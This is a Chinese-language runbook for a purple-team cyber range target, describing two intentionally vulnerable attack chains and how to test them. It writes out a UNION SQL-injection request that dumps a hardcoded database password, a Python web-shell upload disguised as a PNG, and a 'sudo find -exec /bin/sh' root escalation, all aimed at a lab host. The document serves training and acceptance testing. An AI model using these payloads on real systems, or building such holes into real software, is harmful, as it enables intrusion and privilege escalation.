# Runbook —— 靶機真攻擊鏈（票 #44 / #45 / #46；CH2 見 #153）

單機縱深攻擊鏈：**HTTP SQLi → 撈 dbadmin 帳密 → 直連 :3306 → 讀 flag**（CH1）。
本檔是操作與驗收手冊；結構契約由 `tests/deploy/test_target_attack_surface.py`（T1，在 CI）證，
真打進去／真拿 flag／真重烤由下方 T4 在大主機證。CH2（校園海報上傳 → Web Shell →
本機提權）見本檔下方獨立段落。

## 操作規則（先讀這條）

- **換班就重跑 `range-up`。** flag 綁在環境層，同一套環境連跑多場是同一個 flag（spec §5.1
  的已知代價）。下一梯上場前 `sudo bash scripts/range/range-up.sh --with-falco --with-red`
  重鑄 flag，舊 flag 立即失效。
- 當場 flag 在 host 的 `/var/lib/purplescope/current-flag.txt`，供 Range Core 比對玩家提交。
- flag **不烤進 golden**：改 flag 不觸發重烤；改 `app.py`／`bake.sh`／`seed.sql`／`inject-flag.sh`
  才會（它們在 `golden_stamp` 指紋內）。

## 二分：可計分 vs fixture（不要搞混）

| 端點 | 類別 | 說明 |
|---|---|---|
| `/product?id=` | **可計分**（票 #44） | 真 SQLi，紅隊要真的打 |
| `/exec` `/readsecret` `/uncovered` `/healthz`、alloy heartbeat | fixture | 模擬、不掛 objective、T2/T4 測試載具，**行為不變** |

## 攻擊面的授權邊界（為什麼 SQLi 一跳撈不到 flag）

- `webapp@localhost` —— app 用的帳號。只授 `shopdb.*`（含 `credentials`）。SQLi 的 UNION
  只撈得到這個帳號 grant 得到的表 → 撈得到憑證，**碰不到 `vault.flag`**。
- `dbadmin@'%'` —— 憑證表裡那組帳密，可從 VLAN30 遠端連 :3306，是唯一 grant 得到 `vault.*` 的帳號。
- 結論：非得先 SQLi 撈出 dbadmin 帳密、再以它重連 :3306 不可。這是「內容鏈接」的實際 enforcement。

---

## T4 —— 大主機實環境全鏈（gray 跑）

### 1. 重烤 golden（來源檔已改，指紋不符會自動重烤；也可手動）

```bash
sudo bash scripts/range/build-golden-target.sh
```

自證要看到（缺任一則不產 golden）：

```
GOLDEN-DB-STATE: products=1 credentials=1
GOLDEN-FLAG-GUARD: webapp_can_read_flag=0     # 0 = 授權邊界成立
GOLDEN-RULE-HITS: exec=... secret=... uncovered=...
```

### 2. 起 range（靶機 golden + 六台紅隊，紅隊 image 首次會自動 build）

```bash
sudo bash scripts/range/range-up.sh --with-falco --with-red
```

### 3. 走完攻擊鏈（從任一紅隊容器，來源 IP 可分辨）

```bash
# 第一跳：SQLi 撈 credentials（空格要 URL-encode 成 %20）
docker exec range-red1 curl -s \
  "http://10.167.20.10/product?id=0%20UNION%20SELECT%20id,service,username,password%20FROM%20credentials"
#   → 回傳含 dbadmin / D0-n0t-sh1p-th1s-Cred-2026

# 第二跳：拿撈到的帳密直連 :3306 讀 flag
docker exec range-red1 mariadb -h 10.167.20.10 -u dbadmin \
  -p'D0-n0t-sh1p-th1s-Cred-2026' -N -e "SELECT token FROM vault.flag"
#   → 回傳當場 flag，應與 host 的 /var/lib/purplescope/current-flag.txt 相同
```

### 4. 負向驗收（未經利用拿不到 flag）

```bash
# SQLi 直接想撈 flag：webapp 對 vault 無 grant → 權限錯誤，撈不到
docker exec range-red1 curl -s \
  "http://10.167.20.10/product?id=0%20UNION%20SELECT%201,token,1,1%20FROM%20vault.flag"
#   → query error（權限拒絕），不是 flag

# flag 輪換：再跑一次 range-up，flag 應改變
sudo bash scripts/range/range-up.sh --with-falco
diff <(cat /var/lib/purplescope/current-flag.txt) /tmp/flag-before   # 應不同
```

---

# CH2 Foothold —— 校園海報上傳（#153 Campaign Pack v1）

單機縱深攻擊鏈：**上傳偽裝成圖片的 .py「海報」→ render 端點當程式碼執行 → 低權限
render 帳號透過誤設的 sudo find 規則拿到 root**。結構契約由
`tests/deploy/test_range_target_webshell.py`（真 HTTP round-trip，不需要 VM，在 CI）與
`tests/deploy/test_ch2_privesc_infra.py`（bake.sh／build-golden-target.sh 的結構檢查，
CI）證；真的在 golden VM 上 useradd／sudoers／GTFOBins 提權是否成立，由下方 T4 在
大主機證——但 **bake 期本身也會自證一次**（見下方），golden 產不出來就代表 CH2 這條
chain 是壞的，不必等到上場才發現。

## 二分：可計分 vs fixture

| 端點 | 類別 | 說明 |
|---|---|---|
| `/poster/upload` `/poster/render` | **可計分**（#153 CH2） | 真上傳信任鏈漏洞，紅隊要真的打 |
| `/exec` `/readsecret` `/uncovered` `/healthz` | fixture | 與 CH1 共用，行為不變 |

## 攻擊面的信任鏈（為什麼「只查 Content-Type」不夠）

- `/poster/upload` 只驗 `Content-Type` header（攻擊者自報，不驗副檔名或內容）→
  `.py` 檔偽裝成 `image/png` 一樣被存進 `POSTER_DIR`。
- `/poster/render` 對 `.py` 副檔名的海報直接 `python3 <file>` 執行（「進階自訂範本」）。
- render 子行程被 `preexec_fn` 降到低權限 `posterrender` 帳號 —— 但該帳號持有
  `posterrender ALL=(root) NOPASSWD: /usr/bin/find /var/lib/purplescope/posters *`，
  是 GTFOBins 已知的 find 提權型態：`sudo find <dir> -exec /bin/sh \; -quit` 直接拿到
  root shell。**這是本章刻意留的漏洞**，不是疏漏；`tests/deploy/test_ch2_privesc_infra.py`
  的 `test_sudoers_rule_grants_posterrender_unrestricted_find_args` 釘住「這條規則仍然
  可利用」——若哪天有人「好心」把它改成鎖死引數，這條會紅，逼他面對「這就是要拿掉的漏洞」。

## bake 期自證（golden VM 建置時自動跑一次）

`bake.sh` 在 golden 收尾前會**真的走一次完整 CH2 chain**：上傳一支帶 marker 的 `.py`、
打 render 讓它真的執行、再以 `posterrender` 身分真的觸發 sudo find 拿到 root，印出：

```
GOLDEN-CH2-STATE: webshell_hits=1 privesc_whoami=root privesc_rc=0 privesc_falco_hits=1
```

`scripts/range/build-golden-target.sh` 檢查這行：`webshell_hits` 需 ≥1 且
`privesc_whoami` 需為 `root`，任一不成立就**不產 golden**（`bake_fail=1`）。

## T4 —— 大主機實環境全鏈（gray 跑）

```bash
# 1. 重烤 golden（來源檔已改，指紋不符會自動重烤）
sudo bash scripts/range/build-golden-target.sh
# 自證要看到（缺任一則不產 golden）：
#   GOLDEN-CH2-STATE: webshell_hits=1 privesc_whoami=root privesc_rc=0 privesc_falco_hits=1

# 2. 起 range
sudo bash scripts/range/range-up.sh --with-falco --with-red

# 3. 走完攻擊鏈（從任一紅隊容器）
# 第一跳：上傳偽裝成圖片的 .py
docker exec range-red1 curl -s -X POST \
  "http://10.167.20.10/poster/upload?filename=evil.py" \
  -H "Content-Type: image/png" --data-binary "import subprocess; print(subprocess.run(['id'],capture_output=True,text=True).stdout)"
#   → stored evil.py（201）

# 第二跳：render 讓它真的執行
docker exec range-red1 curl -s "http://10.167.20.10/poster/render?name=evil.py"
#   → 回傳 id 指令輸出，證明程式碼真的被執行（此時是 posterrender，不是 root）

# 第三跳（提權，需在靶機本機示範——紅隊容器沒有靶機的本機 shell，這段呈現
# 的是漏洞本身而非透過上傳鏈自動達成；campaign 敘事上視為同一條 chain 的延伸）：
# 在靶機本機以 posterrender 身分：
sudo -u posterrender sudo find /var/lib/purplescope/posters -exec /bin/sh \; -quit
#   → root shell
```

## 負向驗收

```bash
# Content-Type 不在允許清單：應被拒絕（415），不是「完全沒檢查」
docker exec range-red1 curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  "http://10.167.20.10/poster/upload?filename=evil2.py" \
  -H "Content-Type: application/x-python" --data-binary "print(1)"
#   → 415

# 一般圖片副檔名：render 不執行，只回靜態字串
docker exec range-red1 curl -s "http://10.167.20.10/poster/render?name=real.png"
#   → "rendered real.png"（不是程式碼執行結果）
```

## T3 —— range 契約（防火牆）

`RED → TARGET tcp dport {80,3306}` 已由 `scripts/range/build-range.sh` 放行，
`scripts/range/verify-range.sh` 驗收。第二跳連 :3306 在網路層成立即為此契約的實用。

## T2 —— compose 整合

本攻擊鏈是 VM golden 專屬（真 mariadb + 授權邊界），**不在 compose 驗**（spec §6.1：只有真 range
算 scenario）。compose 端的 fixture 端點測試不受本票影響（二分的附帶好處）。
